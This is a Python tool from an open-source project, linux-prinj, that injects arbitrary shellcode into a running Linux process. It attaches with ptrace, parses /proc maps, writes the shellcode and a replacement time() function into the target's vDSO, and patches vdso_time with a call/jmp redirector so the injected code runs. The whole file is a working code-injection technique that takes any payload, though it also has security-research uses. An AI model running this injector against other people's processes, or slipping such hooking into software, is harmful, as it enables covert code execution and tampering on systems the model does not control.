#!/usr/bin/env python3
#
# This file is part of the linux-prinj project.
# https://gitlab.com/pgregoire/linux-prinj/
#
# Copyright 2022 Philippe Grégoire <git@pgregoire.xyz>
#
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

import ctypes

from pwn import *


context.log_level = 'critical'

# -------------------------------------------------------------------- #
# ptrace

libc = None
def loadlibc(path):
    global libc

    libc = ctypes.CDLL(path)

    # ptrace's signature
    libc.ptrace.argtypes = [
        ctypes.c_uint64,
        ctypes.c_uint64,
        ctypes.c_void_p,
        ctypes.c_void_p,
    ]
    libc.ptrace.restype = ctypes.c_uint64


class UserRegsStruct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

def ptrace_attach(pid):
    return libc.ptrace(16, pid, 0, 0)


def ptrace_detach(pid):
    return libc.ptrace(17, pid, 0, 0)


def ptrace_getregs(pid):
    r = UserRegsStruct()
    e = libc.ptrace(12, pid, 0, ctypes.byref(r))
    assert(0 == e)
    return r


def ptrace_setregs(pid, regs):
    e = libc.ptrace(13, pid, 0, ctypes.byref(regs))
    assert(0 == e)


def ptrace_peektext(pid, addr):
    return libc.ptrace(1, pid, addr, 0)


def ptrace_poketext(pid, addr, value):
    return libc.ptrace(4, pid, addr, value)


def ptrace_singlestep(pid):
    libc.ptrace(9, pid, 0, 0)


# helpers
def attach(pid):
    ptrace_attach(pid)
    os.waitpid(pid, 0)


def singlestep(pid):
    ptrace_singlestep(pid)
    os.waitpid(pid, 0)


def wrmem(pid, addr, dat):
    pad = lambda s : (s + (b'\x00' * (8 - (len(dat) % 8))))[:8]

    for i in range(0, len(dat), 8):
        z = u64(pad(dat[i:i+8]))
        ptrace_poketext(pid, addr+i, z)


def rdmem(pid, addr, len):
    r = b''

    for i in range(0, len, 8):
        v = ptrace_peektext(pid, addr+i)
        r += p64(v)

    return r

# -------------------------------------------------------------------- #
# /proc/

def getmaps(pid):
    with open('/proc/{}/maps'.format(pid)) as fp:
        dat = fp.read()

    r = []
    for ln in [e for e in dat.split('\n') if e]:
        s = [e for e in ln.split(' ') if e]
        r += [{
          'addr': s[0],
          'from': int(s[0].split('-')[0], 16),
          'to': int(s[0].split('-')[1], 16),
          'perms': s[1],
          'offset': int(s[2], 16),
          'dev': s[3],
          'devmaj': int(s[3].split(':')[0], 16),
          'devmin': int(s[3].split(':')[1], 16),
          'inode': int(s[4]),
          'path': None if 5 == len(s) else s[5],
        }]

    return r


def findlibc(maps):
    return [m for m in maps if m['path'] and '/libc' in m['path']][0]

# -------------------------------------------------------------------- #

def rdmap(pid, mp):
    return rdmem(pid, mp['from'], mp['to']-mp['from'])


if 3 != len(sys.argv):
    print('usage: inject <shellcode.bin> <pid>', file=sys.stderr)
    exit(1)


with open(sys.argv[1], 'rb') as fp:
    code = fp.read()
pid = int(sys.argv[2])


maps = getmaps(pid)
loadlibc(findlibc(maps)['path'])

# Get the vDSO and vvar maps
for m in maps:
    if '[vdso]' == m['path']:
        vdso = m
for m in maps:
    if '[vvar]' == m['path']:
        vvar = m

assert(vdso and vvar)


#
# time() simply reads from vvar and returns the value.
#
#   mov rax, vvar+0x80
#   mov rax, [rax+0x20]
#   ret
#
alt = b''
alt += b'\x48\xb8' + p64(vvar['from'] + 0x80)
alt += b'\x48\x8b\x40\x20'
alt += b'\xc3'

func_size = len(alt) + (8 - (len(alt) % 8))
func_addr = vdso['to'] - func_size


try:
    attach(pid)

    # Get the vDSO binary
    vdsobin = rdmap(pid, m)
    # pwntools does not support loading ELF from bytes
    with open('vdso.elf', 'wb') as fp:
        fp.write(vdsobin)
    elf = ELF('vdso.elf')

    # Locate vdso_time
    gtod = [elf.symbols[k] for k in elf.symbols if 'vdso_time' in k][0]
    gtod_addr = vdso['from'] + gtod
    print('vdso_time is at offset {} (addr: {})'.format(hex(gtod), hex(gtod_addr)))

    code_size = len(code) + (8 - (len(code) % 8))
    code_addr = func_addr - code_size
    print('Writing shellcode @{}'.format(hex(code_addr)))

    #
    # Redirector
    #
    # We now replace the target function's code with a small redirection
    # shellcode. For it, we'll compute the relative offsets and complete
    # the opcodes manually.
    #
    #     call shellcode
    #     jmp altfunc
    #
    stub = b''
    stub += b'\xe8' + p32(code_addr - gtod_addr - 5 - len(stub))
    stub += b'\xe9' + p32(func_addr - gtod_addr - 5 - len(stub))


    wrmem(pid, func_addr, alt)

    wrmem(pid, code_addr, code)

    print('Writing redirection code @{}'.format(gtod_addr))
    wrmem(pid, gtod_addr, stub)
finally:
    ptrace_detach(pid)
